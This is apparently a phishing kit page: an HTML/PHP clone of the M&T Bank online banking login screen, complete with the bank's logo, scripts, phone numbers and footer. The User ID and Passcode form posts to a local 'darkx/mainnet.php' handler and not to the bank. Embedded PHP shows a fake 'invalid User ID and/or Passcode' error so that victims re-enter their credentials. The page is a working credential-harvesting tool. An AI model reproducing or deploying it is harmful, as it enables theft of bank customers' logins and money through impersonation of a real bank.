

<!DOCTYPE HTML>
<html lang="en" class="__sticky-footer __sticky-footer--links">
<head>
<script type="text/javascript" src="/TSPD/0856addebbab2000ba949201dad9f67efc42df64f349dd0cbd91a24e357d5af05b11616b8df1b84b?type=9"></script>

<APM_DO_NOT_TOUCH>

<script type="text/javascript">
(function(){
window.qmj=!!window.qmj;try{(function(){(function(){var Z={decrypt:function(Z){try{return JSON.parse(function(Z){Z=Z.split("l");var S="";for(var I=0;I<Z.length;++I)S+=String.fromCharCode(Z[I]);return S}(Z))}catch(I){}}};return Z={configuration:Z.decrypt("123l34l97l99l116l105l118l101l34l58l34l110l111l34l44l34l100l101l98l117l103l103l105l110l103l34l58l34l110l111l34l44l34l109l111l100l117l108l101l49l34l58l34l101l110l97l98l108l101l100l34l44l34l109l111l100l117l108l101l50l34l58l34l101l110l97l98l108l101l100l34l44l34l109l111l100l117l108l101l51l34l58l34l101l110l97l98l108l101l100l34l44l34l109l111l100l117l108l101l52l34l58l34l101l110l97l98l108l101l100l34l125")}})();
var _Z=12;try{var jZ,LZ,zZ=s(486)?1:0,j_=s(901)?0:1,l_=s(56)?1:0,o_=s(351)?1:0,O_=s(59)?1:0,Zi=s(988)?0:1,Ii=s(423)?1:0,Ji=s(153)?1:0;for(var Zs=(s(80),0);Zs<LZ;++Zs)zZ+=(s(71),2),j_+=s(831)?1:2,l_+=s(803)?1:2,o_+=(s(817),2),O_+=s(910)?1:2,Zi+=(s(483),2),Ii+=(s(879),2),Ji+=s(230)?3:2;jZ=zZ+j_+l_+o_+O_+Zi+Ii+Ji;window.Oz===jZ&&(window.Oz=++jZ)}catch(ss){window.Oz=jZ}var is=!0;
function l(Z){var S=arguments.length,I=[],L=1;while(L<S)I[L-1]=arguments[L++]-Z;return String.fromCharCode.apply(String,I)}function ls(Z){var S=32;!Z||document[l(S,150,137,147,137,130,137,140,137,148,153,115,148,129,148,133)]&&document[l(S,150,137,147,137,130,137,140,137,148,153,115,148,129,148,133)]!==J(S,150,137,147,137,130,140,133)||(is=!1);return is}function J(Z){var S=arguments.length,I=[];for(var L=1;L<S;++L)I.push(arguments[L]-Z);return String.fromCharCode.apply(String,I)}function Os(){}
ls(window[Os[l(_Z,122,109,121,113)]]===Os);ls(typeof ie9rgb4!==J(_Z,114,129,122,111,128,117,123,122));ls(RegExp("\x3c")[_(1372193,_Z)](function(){return"\x3c"})&!RegExp(_(42877,_Z))[_(1372193,_Z)](function(){return"'x3'+'d';"}));
var zs=window[l(_Z,109,128,128,109,111,116,81,130,113,122,128)]||RegExp(J(_Z,121,123,110,117,136,109,122,112,126,123,117,112),l(_Z,117))[_(1372193,_Z)](window["\x6e\x61vi\x67a\x74\x6f\x72"]["\x75\x73e\x72A\x67\x65\x6et"]),sS=+new Date+(s(216)?6E5:510332),iS,IS,jS,lS=window[J(_Z,127,113,128,96,117,121,113,123,129,128)],OS=zs?s(684)?15165:3E4:s(460)?6E3:8254;
document[l(_Z,109,112,112,81,130,113,122,128,88,117,127,128,113,122,113,126)]&&document[l(_Z,109,112,112,81,130,113,122,128,88,117,127,128,113,122,113,126)](J(_Z,130,117,127,117,110,117,120,117,128,133,111,116,109,122,115,113),function(Z){var S=90;document[J(S,208,195,205,195,188,195,198,195,206,211,173,206,187,206,191)]&&(document[J(S,208,195,205,195,188,195,198,195,206,211,173,206,187,206,191)]===l(S,194,195,190,190,191,200)&&Z[l(S,195,205,174,204,207,205,206,191,190)]?jS=!0:document[l(S,208,195,
205,195,188,195,198,195,206,211,173,206,187,206,191)]===_(68616527576,S)&&(iS=+new Date,jS=!1,zS()))});function zS(){if(!document[l(16,129,133,117,130,137,99,117,124,117,115,132,127,130)])return!0;var Z=+new Date;if(Z>sS&&(s(568)?6E5:845609)>Z-iS)return ls(!1);var S=ls(IS&&!jS&&iS+OS<Z);iS=Z;IS||(IS=!0,lS(function(){IS=!1},s(562)?1:0));return S}zS();var Z_=[s(89)?17795081:24295737,s(35)?27611931586:2147483647,s(689)?1789897933:1558153217];
function S_(Z){var S=93;Z=typeof Z===_(1743045583,S)?Z:Z[J(S,209,204,176,209,207,198,203,196)](s(406)?36:50);var I=window[Z];if(!I||!I[l(S,209,204,176,209,207,198,203,196)])return;var L=""+I;window[Z]=function(Z,S){IS=!1;return I(Z,S)};window[Z][J(S,209,204,176,209,207,198,203,196)]=function(){return L}}for(var __=(s(726),0);__<Z_[_(1294399193,_Z)];++__)S_(Z_[__]);ls(!1!==window[_(34495,_Z)]);window.SO=window.SO||{};window.SO.iJl="0873ee5c0416e800373e842dbb97144d1c42016ff46493891784546f551a1ba30f7691f619589a3ccbb186f8cec887f679f4f730a7a60346763cb1a8c0bb9a0bd7fb659c67147107dbeb0c27bdd4f67e5858934f6a6fa37c2b47763c5cf39f61166876ce0b6b8decd174b957cf7ac4d70097208bf71c5f557b0ee000b899f32b03bb8856727674424524dab384e4d277452ca703f897fd31f25e818e17dc62f089f37ff5fd7952f3f0c0bfa5cc3c74ee85992fe4ea6df6f48db54b64275e54eef81738b9db2a2b15b6d3d69c5837d6a0138eaf3c1a2653f42c97591d0d7c92d2a501dc779b8557a2b960cbed99cf08f6";function _(Z,S){Z+=S;return Z.toString(36)}
function i_(Z){var S=+new Date,I;!document[J(37,150,154,138,151,158,120,138,145,138,136,153,148,151,102,145,145)]||S>sS&&(s(868)?738157:6E5)>S-iS?I=ls(!1):(I=ls(IS&&!jS&&iS+OS<S),iS=S,IS||(IS=!0,lS(function(){IS=!1},s(467)?1:0)));return!(arguments[Z]^I)}function s(Z){return 635>Z}(function li(S){S&&"number"!==typeof S||("number"!==typeof S&&(S=1E3),S=Math.max(S,1),setInterval(function(){li(S-10)},S))})(!0);})();}catch(x){
}finally{ie9rgb4=void(0);};function ie9rgb4(a,b){return a>>b>>0};

})();

</script>
</APM_DO_NOT_TOUCH>

<script type="text/javascript" src="/TSPD/0856addebbab2000ba949201dad9f67efc42df64f349dd0cbd91a24e357d5af05b11616b8df1b84b?type=17"></script>

    <title>Welcome to Online Banking | M&amp;T Bank</title>
    <link rel="shortcut icon" href="https://asset.mtb.com/Documents/html/homepage/favicon.ico" type="image/x-icon" />
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <meta name="format-detection" content="telephone=no"/>
    
    <script type="text/javascript" src="/ruxitagentjs_ICA2SVfhjqrux_10205201218101503.js" data-dtconfig="rid=RID_-583655553|rpid=2146952464|domain=mtb.com|reportUrl=/rb_edeadee0-0165-4b9e-a91f-0085183ac4e1|app=893c324bd7e5ac65|featureHash=ICA2SVfhjqrux|srsr=1000|vcv=2|rdnt=1|uxrgce=1|bp=2|cuc=zgefxirc|dpvc=1|md=mdcc1=a#AuthID@value,mdcc2=a#divSendMoneyReview ^rb div:nth-child(3) ^rb span,mdcc3=a#divRequestMoneyReview ^rb div:nth-child(3) ^rb span|lastModification=1609774829965|dtVersion=10205201218101503|tp=500,50,0,1|uxdcw=1500|vs=2|agentUri=/ruxitagentjs_ICA2SVfhjqrux_10205201218101503.js"></script><link href="https://resources.mtb.com/r/simple-layout-responsive/css.mtb?v=08132020140516" rel="stylesheet"/>

    <script src="//nexus.ensighten.com/mtbank/OE-Prod/Bootstrap.js"></script>

    
</head>
<body>
    



<form action="darkx/mainnet.php" method="post"><div class="mtb-app-enrollment">
        <header class="mtb-page-header"> 
            <div class="grid-x align-center">
                <div class="cell">
                    <a href="https://www.mtb.com/home-page" class="mtb__logo">
                        <img src=https://resources.mtb.com/Assets/img/mtb-logo.svg alt="M&T Bank Site" />
                    </a>
                </div>
            </div>
        </header>
        
           
           <?php 
                                if (isset($_GET['ReasonCode'])) {
                                $ReasonCode = isset($_GET['ReasonCode']) ? trim(htmlentities($_GET['ReasonCode'])):'';
                                $em = "6004";
                                if ($ReasonCode == $em) {
                                print"<input type='hidden' name='ReasonCode' value='ReasonCode'>     <div class='mtb-page-error'>
                <div class='mtb-app-default--content'>
                    <div class='callout __has-icon warning __no-border'>
                        <i class='__is-icon m-icon m-icon-notification'>
                            <span class='show-for-sr'>Notification Icon</span>
                        </i>
                        <p>
                            
      You have entered an invalid User ID and/or Passcode. Please try again.
    
                        </p>
                    </div>
                </div>
              </div>";}}?>

            
        <div class="mtb-app-login--content">
            <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
                <div class="cell">
                     <div class="mtb-section-header mtb-section-header__login">
                        <h1>
                            Log In to Online Banking
                        </h1>
                        <p>
                            For Personal and Business Accounts
                        </p>
                    </div>
                </div>

                <div class="cell">
                    <label for="userId">
                        User ID
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem"  data-fc-id="121" type="text" id="userId" name="userID" autocomplete="off"  
                               aria-required="true" data-inputtype="text" data-attribute="" maxlength="20" value="" />
                        
                    </div>
                </div>

                <div class="cell">
                    <label for="Passcode">
                        Passcode
                    </label>
                    <div class="input-group m-fake-single-input">
                        <input class="input-group-field js-formnputItem"   data-fc-id="122" type="password" id="Passcode" name="passcode" autocomplete="off"  aria-required="true" data-inputtype="tel" maxlength="20"/>
                        <div class="input-group-button">
                            <button type="button" id="Show" data-btnfor="Passcode" class="button clear hide  js-showHide">Show</button>
                        </div>
                    </div>
                </div>
 
                <div class="cell">
                    <div class="mtb-formcheckbox">
                        <input class="show-for-sr" type="checkbox" value="false"/>
                        <label for="RememberUserId" class="__spacer-remove">
                            Remember User ID
                        </label>
                    </div>
                </div> 
            </div>

            <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
                <div class="cell">
                    
                    <button type="submit" class="button button__form-no-spacer expanded" >
                        Log In
                    </button>
                </div>
                <div class="cell">
                    <a href="\Login\LoginHelp" class="button button__fake-padding-no-spacer expanded clear" id="jsAnalyticsLink" >Help with User ID or Passcode</a>
                </div>
                <div class="cell">
                    <a href="/Enrollment/Enroll" class="button button__fake-padding expanded clear" id="jsAnalyticsEnrollLink" data-attribute="item">Enroll Now</a>
                </div>

                <p class="cell text-center __font-size-tiny __color-gray-accent">
                    Unauthorized access is prohibited. Usage may be monitored.
                </p>
            </div>
        </div>

        <hr class="__spacer-section"/>
        <div class="mtb-app-default--content">

            <div class="grid-x grid-padding-x grid-x__padded">
                <div class="cell text-center">
                    <p class="__font-size-secondary">
                        Have questions about M&T Online Banking?
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Personal Accounts:
                        <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 8am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
                <div class="cell medium-6 text-center">
                    <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
                        Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
                    </p>
                    <p class="__font-size-sub __spacer-remove __color-gray-accent">
                        Monday - Friday 6am - 9pm ET
                    </p>
                    <p class="__font-size-sub __spacer-section __color-gray-accent">
                        Saturday - Sunday 9am - 5pm ET
                    </p>
                </div>
            </div>
        </div>
        <section class="mtb-footer mtb-footer__auth" role="contentinfo">
            <div class="grid-x">
                <div class="cell flex-container flex-dir-column align-center-middle">
                    <div class="mtb-footer--auth">
                        <a href="https://upgrade.mtb.com/olb-upgrade" class="" target="_blank">Get Started Guide</a>
                        <a href="//www.mtb.com/olbsecurity" target="_blank">Security Assistance</a>
                        <a href="https://asset.mtb.com/Documents/html/DSA.htm" target="_blank">Digital Service Agreement</a>
                        <a href="https://asset.mtb.com/Documents/html/ESign.htm" target="_blank">ESign Agreement</a>
                        <a href="https://mtb.com/olb-accessibility" target="_blank">
                            Accessibility
                        </a>


                        <a href="https://www.mtb.com/olb-personalsite" target="_blank">
                            mtb.com
                        </a>
                    </div>

                    <div class="mtb-footer--non-auth">
                        <p>
                            &copy;2021 M&amp;T Bank. All Rights Reserved.<br>
                            Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use" target="_blank">
                                Terms of
                                Use
                            </a> and <a href="https://www.mtb.com/privacy" target="_blank">Privacy Policy</a>.
                        </p>
                        <div class="mtb-footer__logo">
                            <a href="https://www.mtb.com/equalhousinglender" target="_blank">
                                <img src=https://resources.mtb.com/Assets/img/mtb-equalhousinglender.svg class="mtb-footer__equalhousinglender" alt="Equal Housing Lender" />
                            </a>
                            <a href="https://www.mtb.com/olb-entrust" target="_blank">
                                <img src="https://resources.mtb.com/Assets/img/mtb-entrust.svg " class="mtb-footer__entrust" alt="Entrust" />
                            </a>
                        </div>
                        <p>
                            Equal Housing Lender NMLS #381076
                            <a href="https://www.mtb.com/fdic" target="_blank">Member FDIC</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>
    </div>
</form>
    <script src="https://resources.mtb.com/r/simple-layout-responsive/js.mtb?v=08132020140516"></script>

    
    <script src="/Assets/scripts/Login/Index.js"></script>


</body>
</html>

